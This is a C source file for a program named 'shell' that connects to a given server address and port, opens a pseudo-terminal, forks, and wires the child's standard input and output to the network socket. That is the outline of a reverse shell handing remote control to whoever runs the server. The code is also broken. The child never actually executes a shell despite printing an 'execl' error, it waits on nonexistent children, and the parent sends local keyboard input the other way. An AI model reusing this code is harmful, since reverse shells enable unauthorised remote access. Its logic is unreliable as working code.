#include <stdio.h>
#include <pty.h>
#include <unistd.h>
#include <sys/wait.h>
#include "client_socket_init.h"
#include "thread_functions.h"

int main(int argc, char *argv[]) {

    int socket_fd;
    int master, slave;
    char buf[2048];
    ssize_t num_bytes;
    pid_t pid;
    pthread_t reader_thread;

    if (argc < 3) {
        fprintf(stderr, "Usage : shell server_ip port\n");
        exit(EXIT_FAILURE);
    }
    socket_fd = get_socket(argv[1], argv[2]);

    if (openpty(&master, &slave, NULL, NULL, NULL) == -1) {
        perror("openpty");
        exit(EXIT_FAILURE);
    }

    pid = fork();

    if (pid == -1) {
        perror("fork");
        exit(EXIT_FAILURE);
    }

    if (pid == 0) {
        //child
        wait(NULL);

        close(master);
        dup2(slave, 0);
        dup2(slave, 1);
        dup2(slave, 2);
        dup2(socket_fd, 1);
        dup2(socket_fd, 0);
        close(slave);
        perror("execl");
        exit(EXIT_FAILURE);

    } else {
        close(slave);
        pthread_create(&reader_thread, NULL, thread_function, (void *) &socket_fd);

        // Wait for either child process termination or error
        int status;
        // Parent process
            while ((num_bytes = read(STDIN_FILENO, buf, sizeof(buf))) > 0) {
                send(socket_fd, buf, num_bytes, 0);
            }

        if (waitpid(pid, &status, 0) == -1) {
            perror("waitpid");
            exit(EXIT_FAILURE);
        }

        // If a child process terminated normally
        if (WIFEXITED(status)) {
            printf("Child process terminated with exit status: %d\n", WEXITSTATUS(status));
        } else if (WIFSIGNALED(status)) {
            printf("Child process terminated by signal: %d\n", WTERMSIG(status));
        }
    }
    return EXIT_SUCCESS;
}